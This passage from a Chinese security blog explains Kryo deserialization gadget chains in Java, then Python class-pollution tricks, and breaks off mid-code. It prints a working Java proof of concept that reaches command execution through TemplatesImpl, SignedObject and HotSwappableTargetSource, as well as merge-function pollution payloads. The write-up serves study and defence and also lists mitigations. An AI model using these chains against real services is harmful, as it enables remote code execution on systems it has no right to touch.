kryo.writeClassAndObject(output,s);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>按理来说应该是可以触发的，但是设置了<br><code>new StdInstantiatorStrategy()</code><br>反序列化的create方法会把TiedMapEntry中的map变量名认成是value<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png" alt><br>导致无法利用</p>
<h3 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h3><p>首先要触发到equals必须要有两个元素（node），而且该元素必须是同一类的，来看看HashMap的putVal源码看看为什么<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png" alt><br>如果两个类都不是同一个类，就会直接进入到该if当中，而不会执行下面的equals。<br>接下来看看具体的代码</p>
<h4 id="HotSwappableTargetSource"><a href="#HotSwappableTargetSource" class="headerlink" title="HotSwappableTargetSource"></a>HotSwappableTargetSource</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javassist.CtNewConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.objenesis.strategy.StdInstantiatorStrategy;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.integration.codec.CodecMessageConverter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.integration.codec.kryo.MessageCodec;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.Message;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.MessageHeaders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.support.GenericMessage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line"></span><br><span class="line">        kryo.setRegistrationRequired(<span class="literal">false</span>);</span><br><span class="line">        kryo.setInstantiatorStrategy(<span class="keyword">new</span> <span class="title class_">StdInstantiatorStrategy</span>());</span><br><span class="line">        <span class="comment">// 二次反序列化</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilGeneratedByJavassist&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public EvilGeneratedByJavassist()&#123;Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&#125;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addConstructor(ctConstructor);</span><br><span class="line">        <span class="type">byte</span>[] byteCode = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;whatever&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;byteCode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化 SignedObject</span></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置二次反序列化入口</span></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(pojoNode1, privateKey, signingEngine);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 一次反序列化</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(pojoNode2);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;s&quot;</span>));</span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, h1, h1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, h2, h2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeClassAndObject(s,hashMap);</span><br><span class="line">        s.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用链是<br><code>HotSwappableTargetSource.equals-&gt;XString.equals-&gt;POJONode.toString-&gt;SignedObject.getObject-&gt;POJONode.toString-&gt;getOutputProperties</code><br>可能有人会好奇为什么要绕一大圈调用两个POJONode.toString才能执行，直接调用最后那个不就行了吗，但是kryo默认是不反序列化transient字段的<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png" alt><br>所以_tfactory是不会被反序列化的，这样导致POJONode调用getter方法的时候会报错，导致执行不了getOutputProperties</p>
<h2 id="Kryo反序列化Javabean"><a href="#Kryo反序列化Javabean" class="headerlink" title="Kryo反序列化Javabean"></a>Kryo反序列化Javabean</h2><p>上面的反序列化都是默认去调用FieldSerializer<br>但是还有很多其他类型的Serializer，都继承Serializer<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png" alt><br>这里面第一个就引起了我的注意，很多反序列化链都是通过调用一些JavaBean去触发一些操作的<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/15.png" alt><br>看到简介，如何使用该Serializer<br>这里我直接给出简单的demo<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line"></span><br><span class="line">        kryo.register(MyClass.class,<span class="keyword">new</span> <span class="title class_">BeanSerializer</span>(kryo, MyClass.class));</span><br><span class="line"></span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">        s.setNum(<span class="number">10</span>);</span><br><span class="line">        s.setHello(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeObject(output,s);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readObject(input, MyClass.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="read-and-write"><a href="#read-and-write" class="headerlink" title="read and write"></a>read and write</h3><p>先来看看源码<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.png" alt><br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/17.png" alt><br>可以发现两个函数都有个<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">property.get</span><br><span class="line">property.set</span><br></pre></td></tr></table></figure><br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.png" alt><br>这些就会触发该类的Bean方法<br>那么其他操作就应该类似于Fastjson里面的那些类了，这里就不在过多叙述了</p>
<h2 id="kryo的防护"><a href="#kryo的防护" class="headerlink" title="kryo的防护"></a>kryo的防护</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kryo.setRegistrationRequired(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p>当使用如上代码，那么所有反序列化的类都必须要被注册，才会被反序列化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kryo.addDefaultSerializer(Class,Serializer)</span><br></pre></td></tr></table></figure>
<p>当使用上面的代码，可以增加自己的Serializer，自己实现serializer的时候增加相应的黑名单即可</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://boogipop.com/2023/06/26/%E4%BB%8ECISCN%E8%A5%BF%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B%E5%AD%A6%E4%B9%A0Kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://boogipop.com/2023/06/26/%E4%BB%8ECISCN%E8%A5%BF%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B%E5%AD%A6%E4%B9%A0Kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></li>
<li><a href="https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/Deserial/Kryo.md">https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/Deserial/Kryo.md</a></li>
<li><a href="https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/CTF/seacloud.md">https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/CTF/seacloud.md</a></li>
</ul>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
        <tag>反序列化</tag>
        <tag>kryo</tag>
      </tags>
  </entry>
  <entry>
    <title>python的trick</title>
    <url>/2023/09/11/python%E7%9A%84trick/</url>
    <content><![CDATA[<p>记录一些python常见的trick<br><span id="more"></span></p>
<h1 id="python反序列化"><a href="#python反序列化" class="headerlink" title="python反序列化"></a>python反序列化</h1><h1 id="python原型链污染"><a href="#python原型链污染" class="headerlink" title="python原型链污染"></a>python原型链污染</h1><p>与javascript类似，也是一切皆对象</p>
<h2 id="base"><a href="#base" class="headerlink" title="__base__"></a>__base__</h2><p>代表着某个类的父类，可以用来去污染到<strong>上一层</strong>父类的属性，如果有多层的话就要多个base<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;haha&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span> : <span class="string">&quot;no way&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#haha</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#haha</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#no way</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#no way</span></span><br></pre></td></tr></table></figure><br><code>__class__</code> 用来获取实例化对象的引用<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">instance.__class__ == son_b</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></p>
<h2 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a>__globals__</h2><p>代表全局变量<br>对于类的内置方法，在重写前都是装饰器，不存在 <code>__globals__</code><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test.__globals__ == <span class="built_in">globals</span>() == a.__init__.__globals__)</span><br><span class="line"><span class="comment">#True</span></span><br></pre></td></tr></table></figure><br>这样就可以通过 <code>__globals__</code> 去污染无继承关系的属性了<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret_var = <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;secret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">b</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = b()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                <span class="string">&quot;a&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Pooooluted ~&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a.secret_class_var)</span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line"><span class="built_in">print</span>(secret_var)</span><br><span class="line"><span class="comment">#114</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(a.secret_class_var)</span><br><span class="line"><span class="comment">#Pooooluted ~</span></span><br><span class="line"><span class="built_in">print</span>(secret_var)</span><br><span class="line"><span class="comment">#514</span></span><br></pre></td></tr></table></figure><br>把这里的payload，改成下面的，也可以给b增加原本不存在的属性<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">payload = <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;secret_var&quot;</span> <span class="punctuation">:</span> <span class="number">514</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;b&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;secret_class_var&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;Pooooluted ~&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>这里并不是非要去污染 <code>__init__</code> ，如果b中有其他成员方法也是可以的</p>
</blockquote>
<p>还可以污染到其他文件的内容<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> test_1</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;test_1&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                <span class="string">&quot;target_class&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Poluuuuuuted ~&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#114</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#514</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#Poluuuuuuted ~</span></span><br></pre></td></tr></table></figure></p>
<h2 id="sys-modules"><a href="#sys-modules" class="headerlink" title="sys.modules"></a>sys.modules</h2><p><code>sys</code> 模块的 <code>modules</code> 属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span> : &#123;</span><br><span 